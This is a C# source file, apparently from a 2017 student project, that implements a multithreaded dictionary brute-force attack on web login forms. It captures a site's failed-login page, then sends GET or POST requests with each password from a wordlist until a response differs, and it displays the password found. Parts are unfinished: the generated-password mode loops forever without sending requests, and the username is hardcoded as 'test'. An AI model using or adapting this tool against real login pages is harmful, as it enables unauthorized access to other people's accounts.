/* ETML
 * 
 * Author : Larry Lam, Justin Vuffray
 * Date : 06.11.2017
 * Description : Traitement de la vue.
 * 
 * 
 * */

using System.Net;
using System.Collections.Specialized;
using System.Windows.Forms;
using System.Linq;
using System.IO;
using System;
using System.Threading;
using System.Collections.Generic;

namespace BruteForce
{
    class BruteForceHTTP
    {
        private const int NB_THREAD = 2;

        public string getUsername = "";
        public string getPassword = "";

        private FileStream fl;
        private int nbLine;

        private string badRequest = "";
        private string badRequestPost = "";
        public string passwordRight = "";
        private HttpWebResponse reponseGET;
        private bool methodGET = true;
        private string finalRequest = "";

        //Dictionnaire
        private string[] allPassword;
        private string dictionnaryPath;




        //Checkboxes
        private bool majuscules = false;
        private bool minuscules = false;
        private bool numbers = false;
        private bool symbols = false;

        //Methode
        private string method;//1 = post, 2 = get
        private int mode = 1;//1 = dictionnary, 2 = generated
        private int methodNum;

        //Max & Min char
        private int maxChar;
        private int minChar;

        private string url;
        private string login;
        private string password;
        private string username;

        WebClient wb = new WebClient();
        NameValueCollection data = new NameValueCollection();

        public BruteForceHTTP(string _url, string _login, string _password, string _path, bool _majuscules, bool _minuscules, bool _numbers, bool _symbols, int _method, int _mode, int _maxChar, int _minChar, string _username,string _getUsername,string _getPassword)
        {
            url = _url;
            login = _login;
            password = _password;
            dictionnaryPath = _path;
            majuscules = _majuscules;
            minuscules = _minuscules;
            numbers = _numbers;
            symbols = _symbols;
            maxChar = _maxChar;
            minChar = _minChar;
            url = _url;
            login = _login;
            password = _password;
            username = _username;
            getUsername = _getUsername;
            getPassword = _getPassword;
            method = (_method == 1 ? "POST" : "GET");
            mode = _mode;
            methodNum = _method;

            if (mode == 1)
            {
                ReadDictionnary();
            }
            else
            {
                generatePasswords();
            }

        }

        private void generatePasswords()
        {
            RandomPassword password = new RandomPassword(minChar, maxChar, minuscules, majuscules, numbers, symbols);
            do
            {
                string psw = password.Generate();
                //POST
                if (methodNum == 1)
                {
                    //POSTRequest(psw);
                }
                else//GET
                {
                    //GETRequest(psw);

                }
            } while (true);

            /*
            foreach (string s in allPassword)
            {
                //S'il y a des majuscules
                if (s.Any(char.IsUpper) == majuscules)
                {
                    //S'il y a des minuscules
                    if (s.Any(char.IsLower) == minuscules)
                    {
                        //S'il y a des chiffres
                        if (s.Any(char.IsDigit) == numbers)
                        {
                            //S'il y a des symbols
                            if (s.Any(ch => !Char.IsLetter(ch) == symbols))
                            {
                                //Si le mot respecte la taille min et max définie
                                if (s.Length >= minChar && s.Length <= maxChar)
                                {
                                    //POST
                                    if (methodNum == 1)
                                    {
                                        POSTRequest(s);
                                    }
                                    else//GET
                                    {
                                        GETRequest(s);

                                    }
                                }
                            }
                        }
                    }
                }
            }*/
        }


        private void ReadDictionnary()
        {
            try
            {
                //ouvertur du dictionnaire
                fl = File.OpenRead(dictionnaryPath);
                //stocker dans une string les mots de passes
                allPassword = File.ReadAllLines(dictionnaryPath);
                //nombre de mot de passe
                nbLine = allPassword.Count();
            }
            catch
            {
                MessageBox.Show("Pas de dictionnaire ici..");
            }
            //choix de la méthode
            if (methodNum == 1)
            {
                methodGET = false;
            }
            else//GET
            {
                methodGET = true;

            }
            //construire l'url avec des guid car c'est unique donc aucun user aura ce mdp et nom
            String _url = constructUrl(url, getUsername, Guid.NewGuid().ToString(), getPassword, Guid.NewGuid().ToString());
            //lancer la requete
            WebRequest request = WebRequest.Create(_url);

            try
            {
                reponseGET = (HttpWebResponse)request.GetResponse();
            }
            catch { }

            using (WebClient client = new WebClient())
            {
                byte[] response =
                client.UploadValues(url, new NameValueCollection()
                {
                        { getUsername, Guid.NewGuid().ToString() },
                        { getPassword, Guid.NewGuid().ToString() }
                });

                badRequestPost = System.Text.Encoding.UTF8.GetString(response);

            }
            
            //stocker la page avec connexion échouée
            StreamReader sr = new StreamReader(reponseGET.GetResponseStream());
            badRequest = sr.ReadToEnd();
            //lANCEMENT DES REQUETES EN MULTITHREAD
            List<Thread> threadList = new List<Thread>();
            Thread dividePasswordFinder1 = new Thread(thread1Start);
            threadList.Add(dividePasswordFinder1);
            Thread dividePasswordFinder2 = new Thread(thread2Start);
            threadList.Add(dividePasswordFinder2);
            //lancer les threads
            foreach (Thread th in threadList)
            {
                th.Start();
            }

            //attendre la fin des threads
            foreach (Thread th in threadList)
            {
                th.Join();
            }
            
            MessageBox.Show(passwordRight);
            /*try
            {
                allPassword = System.IO.File.ReadAllLines(dictionnaryPath);
                nbLine = allPassword.Count();
            }
            catch
            {
                MessageBox.Show("Le dictionnaire est introuvable...");
                allPassword = null;
                nbLine = 0;
            }
            foreach (string s in allPassword)
            {
                //POST
                if (methodNum == 1)
                {
                    POSTRequest(s);
                }
                else//GET
                {
                    GETRequest(s);

                }
            }*/
        }

        /* private void POSTRequest(string _password)
         {
             data[login] = username;
             data[password] = _password;
             var response = wb.UploadValues(url, method, data);

             using (WebClient client = new WebClient())
             {
                                 byte[] postReponse =
                 client.UploadValues(url, new NameValueCollection()
                 {
                                         { getUsername, "test" },
                                         { getPassword, _password }
                 });

                 string result = System.Text.Encoding.UTF8.GetString(postReponse);

                 //comparer la page si elle est similaire à celle d'erreur
                 if (result != badRequestPost)
                 {
                     //retourner le mot de passe trouvé
                     return _password;
                 }
             }
         }*/

        /// <summary>
        /// Lancer le 1er thread
        /// </summary>
        private void thread1Start()
        {
            if (methodGET)
            {
                string find = "";
                find = findPasswordThreadGET(0);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
            else
            {
                string find = "";
                find = findPasswordThreadPOST(0);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
        }

        /// <summary>
        /// Lancer le 2eme thread
        /// </summary>
        private void thread2Start()
        {
            if (methodGET)
            {
                string find = "";
                find = findPasswordThreadGET(1);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
            else
            {
                string find = "";
                find = findPasswordThreadPOST(1);

                //si le mdp est vide ce n'est pas le bon
                if (find != "")
                {
                    //stocker le mot de passe si il est trouvé
                    passwordRight = find;
                }
            }
        }

        /// <summary>
        /// Trouve le mot de passe
        /// </summary>
        /// <param name="iStart">numero du thread</param>
        /// <returns>le mot de passe ou rien</returns>
        public string findPasswordThreadGET(int iStart)
        {
            //variable mot de passe
            String passwordThread = "";

            WebRequest request;
            //string de l'url pour la requete
            string _url;
            //reponse de la requete
            StreamReader sr;

            //diviser le dictionaire et tester si le mot de passe est corrrect
            for (int i = nbLine / NB_THREAD * iStart; i < nbLine / NB_THREAD + nbLine / NB_THREAD * iStart; i++)
            {
                //construction de l'url avec le mot de passe dedans
                _url = constructUrl(url, getUsername, "test", getPassword, allPassword[i]);
                //lancer la requete
                request = WebRequest.Create(_url);
                reponseGET = (HttpWebResponse)request.GetResponse();
                //stocker le résultat
                sr = new StreamReader(reponseGET.GetResponseStream());
                finalRequest = sr.ReadToEnd();

                //comparer la page si elle est similaire à celle d'erreur
                if (finalRequest != badRequest)
                {
                    //retourner le mot de passe trouvé
                    return allPassword[i];
                }
            }
            //retourner si le mot de passse n'est pas trouvé
            return passwordThread;

        }

        public string findPasswordThreadPOST(int iStart)
        {
            string passwordToReturn = "";
            using (WebClient client = new WebClient())
            {
                //diviser le dictionaire et tester si le mot de passe est corrrect
                for (int i = nbLine / NB_THREAD * iStart; i < nbLine / NB_THREAD + nbLine / NB_THREAD * iStart; i++)
                {
                    byte[] response =
                client.UploadValues(url, new NameValueCollection()
                {
                        { getUsername, "test" },
                        { getPassword, allPassword[i] }
                });

                    string result = System.Text.Encoding.UTF8.GetString(response);

                    //comparer la page si elle est similaire à celle d'erreur
                    if (result != badRequestPost)
                    {
                        //retourner le mot de passe trouvé
                        return allPassword[i];
                    }

                }
            }

            return passwordToReturn;
        }

        /// <summary>
        /// Construire l'url pour la requete
        /// </summary>
        /// <param name="_url"></param>
        /// <param name="_get"></param>
        /// <param name="_getText"></param>
        /// <param name="_get2"></param>
        /// <param name="_get2Text"></param>
        /// <returns></returns>
        private string constructUrl(string _url, string _get, string _getText, string _get2, string _get2Text)
        {
            string toReturn;
            if (_url.Contains("?"))
            {
                toReturn = _url + "&" + _get + "=" + _getText + "&" + _get2 + "=" + _get2Text;
            }
            else
            {
                toReturn = _url + "?" + _get + "=" + _getText + "&" + _get2 + "=" + _get2Text;
            }

            return toReturn;
        }

    }
}

